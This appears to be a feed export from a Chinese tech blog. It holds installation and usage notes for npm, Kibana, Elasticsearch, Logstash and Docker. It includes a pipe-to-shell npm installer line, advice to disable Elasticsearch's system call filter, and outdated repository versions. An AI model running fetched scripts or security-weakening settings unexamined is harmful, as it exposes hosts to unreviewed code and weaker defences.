        <content type="html"><![CDATA[<h2 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://www.npmjs.com/install.sh | sh</span><br></pre></td></tr></table></figure><p>sudo node bin&#x2F;npm-cli.js install -g -f</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>npm 获取配置有6种方式，优先级由高到底。</p><ul><li>命令行参数。 –proxy <a href="http://server:port即将proxy的值设为http://server:port。">http://server:port即将proxy的值设为http://server:port。</a></li><li>环境变量。 以npm_config_为前缀的环境变量将会被认为是npm的配置属性。如设置proxy可以加入这样的环境变量npm_config_proxy&#x3D;<a href="http://server:port。">http://server:port。</a></li><li>用户配置文件。可以通过npm config get userconfig查看文件路径。如果是mac系统的话默认路径就是$HOME&#x2F;.npmrc。</li><li>全局配置文件。可以通过npm config get globalconfig查看文件路径。mac系统的默认路径是&#x2F;usr&#x2F;local&#x2F;etc&#x2F;npmrc。</li><li>内置配置文件。安装npm的目录下的npmrc文件。</li><li>默认配置。 npm本身有默认配置参数，如果以上5条都没设置，则npm会使用默认配置参数。</li></ul><p>npm 配置命令操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm config set &lt;key&gt; &lt;value&gt; [--global]</span><br><span class="line">npm config get &lt;key&gt;</span><br><span class="line">npm config delete &lt;key&gt;</span><br><span class="line">npm config list</span><br><span class="line">npm config edit</span><br><span class="line">npm get &lt;key&gt;</span><br><span class="line">npm set &lt;key&gt; &lt;value&gt; [--global]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">With the --production flag (or when the NODE_ENV environment variable is set to production), npm will not install modules listed in devDependencies.&quot;</span><br><span class="line"></span><br><span class="line">The --only=&#123;prod[uction]|dev[development]&#125; argument will cause either only devDependencies or only non-devDependencies to be installed regardless of the NODE_ENV.&quot;</span><br></pre></td></tr></table></figure><p>npm 常用配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配置代理</span><br><span class="line">npm config set proxy http://server:port</span><br><span class="line">npm config set https-proxy http://server:port</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">配置私有仓库</span><br><span class="line">npm config set registry &quot;https://registry.npm.taobao.org&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;/usr/local&quot;</span><br></pre></td></tr></table></figure><h3 id="版本的格式"><a href="#版本的格式" class="headerlink" title="版本的格式"></a>版本的格式</h3><p>NPM中的包版本采用<a href="https://semver.org/lang/zh-CN/">semver</a>规范。</p><p>major.minor.patch</p><p>主版本号.次版本号.修补版本号</p><ul><li><p>version</p><p>  必须匹配某个版本。</p><p>  如：1.1.2，表示必须依赖1.1.2版</p></li><li><p>&gt;version</p><p>  必须大于某个版本。</p><p>  如：&gt;1.1.2，表示必须大于1.1.2版</p></li><li><p>&gt;&#x3D;version</p><p>  可大于或等于某个版本。</p><p>  如：&gt;&#x3D;1.1.2，表示可以等于1.1.2，也可以大于1.1.2版本</p></li><li><p>&lt;version</p><p>  必须小于某个版本。</p><p>  如：&lt;1.1.2，表示必须小于1.1.2版本</p></li><li><p>&lt;&#x3D;version</p><p>  可以小于或等于某个版本</p><p>  如：&lt;&#x3D;1.1.2，表示可以等于1.1.2，也可以小于1.1.2版本</p></li><li><p>~version</p><p>  大概匹配某个版本</p><p>  如果minor版本号指定了，那么minor版本号不变，而patch版本号任意</p><p>  如果minor和patch版本号未指定，那么minor和patch版本号任意</p><p>  如：~1.1.2，表示&gt;&#x3D;1.1.2 &lt;1.2.0，可以是1.1.2，1.1.3，1.1.4，…..，1.1.n </p><p>  如：~1.1，表示&gt;&#x3D;1.1.0 &lt;1.2.0，可以是同上</p><p>  如：~1，表示&gt;&#x3D;1.0.0 &lt;2.0.0，可以是1.0.0，1.0.1，1.0.2，…..，1.0.n，1.1.n，1.2.n，…..，1.n.n</p></li><li><p>^version</p><p>  兼容某个版本</p><p>  版本号中最左边的非0数字的右侧可以任意</p><p>  如果缺少某个版本号，则这个版本号的位置可以任意</p><p>  如：^1.1.2 ，表示&gt;&#x3D;1.1.2 &lt;2.0.0，可以是1.1.2，1.1.3，…..，1.1.n，1.2.n，…..，1.n.n</p><p>  如：^0.2.3 ，表示&gt;&#x3D;0.2.3 &lt;0.3.0，可以是0.2.3，0.2.4，…..，0.2.n</p><p>  如：^0.0，表示 &gt;&#x3D;0.0.0 &lt;0.1.0，可以是0.0.0，0.0.1，…..，0.0.n</p></li><li><p>x-range</p><p>  x的位置表示任意版本</p><p>  如：1.2.x，表示可以1.2.0，1.2.1，…..，1.2.n</p></li><li><p>*-range</p><p>  任意版本，””也表示任意版本</p><p>  如：*，表示&gt;&#x3D;0.0.0的任意版本</p></li><li><p>version1 - version2</p><p>  大于等于version1，小于等于version2</p><p>  如：1.1.2 - 1.3.1，表示包括1.1.2和1.3.1以及他们件的任意版本</p></li><li><p>range1 || range2</p><p>  满足range1或者满足range2，可以多个范围</p><p>  如：&lt;1.0.0 || &gt;&#x3D;2.3.1 &lt;2.4.5 || &gt;&#x3D;2.5.2 &lt;3.0.0，表示满足这3个范围的版本都可以</p></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li><p>npm init   </p><p> 初始化项目</p></li><li><p>npm i <packageName> [–save|–save-dev]</p><p> 安装一个模块 </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i express --save</span><br><span class="line">npm i express@3 --save </span><br><span class="line">npm i gulp --save-dev</span><br></pre></td></tr></table></figure><ul><li>–save：安装模块，并将版本写到<code>dependencies</code>中。</li><li>–save-dev：安装模块，并将版本写到<code>devDependencies</code>中。</li><li>–force：同<code>-f</code>，强制重新安装。</li></ul></li><li><p>npm update</p><p> 更新已安装模块。</p></li><li><p>npm cache</p><p> NPM从<code>registry</code>下载压缩包之后，都存放在本地的缓存目录。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ npm cache -h</span><br><span class="line">npm cache add &lt;tarball file&gt;</span><br><span class="line">npm cache add &lt;folder&gt;</span><br><span class="line">npm cache add &lt;tarball url&gt;</span><br><span class="line">npm cache add &lt;git url&gt;</span><br><span class="line">npm cache add &lt;name&gt;@&lt;version&gt;</span><br><span class="line">npm cache clean</span><br><span class="line">npm cache verify</span><br></pre></td></tr></table></figure></li><li><p>npm outdated</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ npm outdated</span><br><span class="line">Package  Current  Wanted  Latest  Location</span><br><span class="line">debug      2.6.9   2.6.9   3.1.0  requestbin</span><br><span class="line">ejs        2.5.9   2.5.9   2.6.1  requestbin</span><br></pre></td></tr></table></figure></li><li><p>npm list</p><p> 列出来模块依赖树</p></li><li><p>npm version </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm version patch 增加一位补丁号（比如 1.1.1 -&gt; 1.1.2）</span><br><span class="line">npm version minor 增加一位小版本号（比如 1.1.1 -&gt; 1.2.0）</span><br><span class="line">npm version major 增加一位大版本号（比如 1.1.1 -&gt; 2.0.0）。</span><br></pre></td></tr></table></figure></li></ol><h3 id="package-lock-json"><a href="#package-lock-json" class="headerlink" title="package-lock.json"></a>package-lock.json</h3><p><code>NPM5</code>开始引入了<code>package-lock.json</code>，<code>package-lock.json</code>能保证各个开发者安装模块时模板的版本都是相同的。<code>package-lock.json</code>的规则期间有些变化，现在最终规则是<strong>只有当 package.json 有改变并且和 lock 里的规则不兼容，才会修改 package-lock.json</strong>。</p><h3 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h3><ol><li>prepublish：发布一个模块前执行。</li><li>publish, postpublish：发布一个模块后执行。</li><li>preinstall：安装一个模块前执行。</li><li>install, postinstall：安装一个模块后执行。</li><li>preuninstall, uninstall：卸载一个模块前执行。</li><li>postuninstall：卸载一个模块后执行。</li><li>preversion, version：更改模块版本前执行。</li><li>postversion：更改模块版本后执行。</li><li>pretest, test, posttest：运行npm test命令时执行。</li><li>prestop, stop, poststop：运行npm stop命令时执行。</li></ol><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li><p>unsafe-perm</p><p>  Default: false if running as root, true otherwise<br>  Type: Boolean<br>  Set to true to suppress the UID&#x2F;GID switching when running package scripts. If set explicitly to false, then installing as a non-root user will fail.</p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.csdn.net/ligang2585116/article/details/47703291">【1】</a> <a href="http://codecloud.net/12932.html">【2】</a> <a href="http://www.admin10000.com/document/6736.html">【3】</a> <a href="https://github.com/npm/npm#fancy-install-unix">【4】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yum-zip.md</title>
      <link href="/post/yum-zip.html"/>
      <url>/post/yum-zip.html</url>
      
        <content type="html"><![CDATA[<ol><li>安装zip,unzip</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zip unzip -y</span><br></pre></td></tr></table></figure><ol start="2"><li>参考<br><a href="http://blog.csdn.net/xanxng/article/details/7723527">【1】</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>install-kibana</title>
      <link href="/post/install-kibana.html"/>
      <url>/post/install-kibana.html</url>
      
        <content type="html"><![CDATA[<ol><li>导入密钥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>配置源<br>在<code>/etc/yum.repos.d/</code>目录下新建<code>kibana.repo</code>写入一下内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[kibana-4.5]</span><br><span class="line">name=Kibana repository for 4.5.x packages</span><br><span class="line">baseurl=http://packages.elastic.co/kibana/4.5/centos</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><ol start="3"><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum install kibana -y</span><br></pre></td></tr></table></figure><ol start="4"><li>配置开机启动</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add kibana</span><br></pre></td></tr></table></figure><ol start="5"><li>启动服务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service kibana start</span><br></pre></td></tr></table></figure><ol start="6"><li>参考<br><a href="https://www.elastic.co/guide/en/kibana/4.5/setup.html#setup-repositories">【1】</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
            <tag> kibana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>install-elasticsearch</title>
      <link href="/post/install-elasticsearch.html"/>
      <url>/post/install-elasticsearch.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h3><ol><li>导入密钥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>配置源<br>在<code>/etc/yum.repos.d/</code>目录下新建<code>elasticsearch.repo</code>写入一下内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[elasticsearch-2.x]</span><br><span class="line">name=Elasticsearch repository for 2.x packages</span><br><span class="line">baseurl=https://packages.elastic.co/elasticsearch/2.x/centos</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><ol start="3"><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line"># 需要jre支持</span><br><span class="line">yum install java-1.8.0-openjdk.x86_64 elasticsearch -y</span><br></pre></td></tr></table></figure><ol start="4"><li>配置开机启动</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add elasticsearch</span><br></pre></td></tr></table></figure><ol start="5"><li>启动服务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service elasticsearch start</span><br></pre></td></tr></table></figure><ol start="6"><li>参考<br><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-repositories.html">【1】</a> <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/rpm.html">【2】</a></li></ol><h3 id="elasticsearch和传统数据库对照关系"><a href="#elasticsearch和传统数据库对照关系" class="headerlink" title="elasticsearch和传统数据库对照关系"></a>elasticsearch和传统数据库对照关系</h3><blockquote><p>在Elasticsearch中，文档归属于一种类型(type),而这些类型存在于索引(index)中，我们可以画一些简单的对比图来类比传统关系型数据库：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns</span><br><span class="line">Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields</span><br><span class="line">```                                                                                                                                                                                                                </span><br><span class="line">Elasticsearch集群可以包含多个索引(indices)（数据库），每一个索引可以包含多个类型(types)（表），每一个类型包含多个文档(documents)（行），然后每个文档包含多个字段(Fields)（列）。</span><br><span class="line"></span><br><span class="line">### logstash elasticsearch output 配置</span><br><span class="line"></span><br><span class="line">&lt;https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html&gt;</span><br><span class="line"></span><br><span class="line">![](/images/QQ20160803-0.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 插件</span><br><span class="line">plugin install delete-by-query</span><br><span class="line"></span><br><span class="line">### elasticsearch 配置</span><br><span class="line">编辑 `vim /etc/elasticsearch/elasticsearch.yml`</span><br><span class="line">``` yml</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol><li><p>system call filters failed to install; check the logs and fix your configuration or disable system call filters at your own risk</p><p> 原因：<br> 这是在因为Centos6不支持SecComp，而ES5.2.0默认bootstrap.system_call_filter为true进行检测，所以导致检测失败，失败后直接导致ES不能启动。<br> 解决：<br> 在elasticsearch.yml中配置bootstrap.system_call_filter为false，注意要在Memory下面:    </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bootstrap.memory_lock: false    </span><br><span class="line">bootstrap.system_call_filter: false    </span><br></pre></td></tr></table></figure></li><li><p>max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536] </p><p> 编辑limits.conf 文件追加<br> vim &#x2F;etc&#x2F;security&#x2F;limits.conf   </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch soft nofile 65536    </span><br><span class="line">elasticsearch hard nofile 65536    </span><br></pre></td></tr></table></figure></li><li><p>max number of threads [1024] for user [elasticsearch] is too low, increase to at least [2048]</p><p> 编辑90-nproc.conf 追加<br> vim &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;90-nproc.conf </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch soft nproc 2048</span><br></pre></td></tr></table></figure></li><li><p>报找不到JAVA_HOME</p><p> 配置elasticsearch环境变量 ，增加<br> vim &#x2F;etc&#x2F;sysconfig&#x2F;elasticsearch</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Elasticsearch Java path JAVA_HOME</span><br><span class="line"># Elasticsearch Java path</span><br><span class="line">JAVA_HOME=/usr/local/java/</span><br></pre></td></tr></table></figure></li><li><p>can not run elasticsearch as root</p><p> 不能以root用户启动ES服务器。新建elasticsearch运行。</p></li><li><p>Could not register mbeans java.security.AccessControlException: access denied (“javax.management.MBeanTrustPermission” “register”)</p><p> 找到使用的jre (find &#x2F; -name java.policy) jre&#x2F;lib&#x2F;security&#x2F;java.policy 追加</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission javax.management.MBeanTrustPermission &quot;register&quot;;</span><br></pre></td></tr></table></figure></li><li><p>Fielddata is disabled on text fields by default.</p><ul><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/fielddata.html">https://www.elastic.co/guide/en/elasticsearch/reference/current/fielddata.html</a></li><li><a href="http://blog.csdn.net/u011403655/article/details/71107415">http://blog.csdn.net/u011403655/article/details/71107415</a></li></ul></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.csdn.net/feifantiyan/article/details/54614614">http://blog.csdn.net/feifantiyan/article/details/54614614</a>  </li><li><a href="http://blog.csdn.net/cardinalzbk/article/details/54924511">http://blog.csdn.net/cardinalzbk/article/details/54924511</a></li><li><a href="https://yemengying.com/2016/03/18/Elasticsearch%E9%85%8D%E7%BD%AE%E9%A1%B9-Local-gateway-HTTP-Indices-Network-Settings%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE/">https://yemengying.com/2016/03/18/Elasticsearch%E9%85%8D%E7%BD%AE%E9%A1%B9-Local-gateway-HTTP-Indices-Network-Settings%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE/</a></li><li><a href="http://es.xiaoleilu.com/010_Intro/25_Tutorial_Indexing.html">http://es.xiaoleilu.com/010_Intro/25_Tutorial_Indexing.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装Logstash</title>
      <link href="/post/install-logstash.html"/>
      <url>/post/install-logstash.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装Logstash"><a href="#安装Logstash" class="headerlink" title="安装Logstash"></a>安装Logstash</h2><ol><li>导入密钥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>配置源<br>在<code>/etc/yum.repos.d/</code>目录下新建<code>logstash.repo</code>写入一下内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[logstash-2.3]</span><br><span class="line">name=Logstash repository for 2.3.x packages</span><br><span class="line">baseurl=https://packages.elastic.co/logstash/2.3/centos</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><ol start="3"><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum install logstash</span><br></pre></td></tr></table></figure><ol start="4"><li>安装目录介绍</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@doog-os ~]# whereis logstash</span><br><span class="line">logstash: /etc/logstash /opt/logstash/bin/logstash.bat /opt/logstash/bin/logstash</span><br><span class="line"></span><br><span class="line">/opt/logstash/bin/logstash      #执行文件</span><br><span class="line">/etc/logstash/conf.d/           #配置文件目录      </span><br></pre></td></tr></table></figure><ol start="5"><li>添加开机启动</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add kibana</span><br><span class="line"></span><br><span class="line"># logstash服务的配置文件</span><br><span class="line">/etc/sysconfig/logstash   </span><br></pre></td></tr></table></figure><ol start="6"><li>参考</li></ol><ul><li><a href="https://www.elastic.co/guide/en/logstash/current/installing-logstash.html#package-repositories">Installing Logstash</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> logstash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/post/Docker.html"/>
      <url>/post/Docker.html</url>
      
        <content type="html"><![CDATA[<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官方建议内核版本最好在3.1以上（可以通过<code>uname -r</code>命令查看内核版本，通过<code>cat /etc/issue</code>查看发行版），必须是64位操作系统。</p><p><a href="https://docs.docker.com/install/linux/docker-ce/centos/">https://docs.docker.com/install/linux/docker-ce/centos/</a></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li><p>查看docker信息</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure></li><li><p>拉取一个镜像。名字是node,版本是4</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull node:4</span><br></pre></td></tr></table></figure></li><li><p>查看本地镜像</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images [name:tag]</span><br></pre></td></tr></table></figure></li><li><p>删除镜像&#x2F;容器</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [name:id] 删除容器</span><br><span class="line">docker rmi [id] 删除镜像</span><br></pre></td></tr></table></figure></li><li><p>列出所有正在运行的镜像</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">-a 列出当前系统中所有容器</span><br><span class="line">-l 列出最后一次使用的容器</span><br></pre></td></tr></table></figure></li><li><p>重新启动容器</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [name|id]</span><br></pre></td></tr></table></figure></li><li><p>停止容器</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [name|id]</span><br></pre></td></tr></table></figure></li><li><p>附着到容器上</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [name|id]</span><br></pre></td></tr></table></figure></li><li><p>查看容器内进程</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top [name|id]</span><br></pre></td></tr></table></figure></li><li><p>docker run [OPTIONS] IMAGE[:TAG] [COMMAND] [ARG…]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--name 容器名字</span><br><span class="line">--restart=[always|on-failure:5] 自动重启</span><br><span class="line">-d 后台运行</span><br><span class="line">-v 共享文件系统 e.g, -v /home/doog/app:/root/app</span><br><span class="line">-i -t 进入交互式环境</span><br><span class="line">--link 连接到另外一个容器。e.g, --link redis-name:redis_alias</span><br><span class="line">--rm 运行完删除</span><br><span class="line">-m 内存大小</span><br><span class="line">-c cpu优先级和调度周期</span><br><span class="line">-e 环境变量 e.g, -e &quot;deep=purple&quot;</span><br><span class="line">--env 环境变量</span><br><span class="line">-h hostname</span><br><span class="line">-u 指定用户，默认root</span><br><span class="line">-w 工作目录，默认/</span><br><span class="line">-p 绑定端口 e.g, -p 50122:22 主机的50122端口映射到容器的22端口</span><br></pre></td></tr></table></figure></li><li><p>获取容器信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [name:id]</span><br><span class="line">-f | --format &#x27;&#123;&#123; .key1.key1 &#125;&#125;&#x27; 类似获取json对象值的方式来获取值</span><br></pre></td></tr></table></figure></li><li><p>查看端口绑定信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [name:id]</span><br></pre></td></tr></table></figure></li><li><p>在容器内执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec [-it] [name:id] [COMMAND]</span><br><span class="line"></span><br><span class="line">docker exec -it c5c696316553 /bin/sh</span><br></pre></td></tr></table></figure></li><li><p>构建镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t [name:tag] . </span><br></pre></td></tr></table></figure></li></ol><h3 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker save doog/node:0.0.1 -1 node-001.tar.gz    # 导出镜像</span><br><span class="line">gunzip -c node-001.tar.gz | docker load                    # 导入镜像</span><br></pre></td></tr></table></figure><h3 id="Docker容器操作"><a href="#Docker容器操作" class="headerlink" title="Docker容器操作"></a>Docker容器操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [name|id] &gt; ./doog-node.tar.gz                  # 导出容器</span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li><p><code>WORKDIR</code>默认为<code>/</code>。</p></li><li><p><code>ADD</code>命令：如果<src>是一个本地的压缩包且<dest>是以“&#x2F;”结尾的目录，则会调用“tar -x”命令解压缩，如果<dest>有同名文件则覆盖，但<src>是一个url时不会执行解压缩。</p></li><li><p><code>ADD</code>比<code>COPY</code>多了2个功能, 下载URL和解压。</p></li><li><p><code>VOLUME</code> 与 <code>-v</code>的使用场景。</p><p> 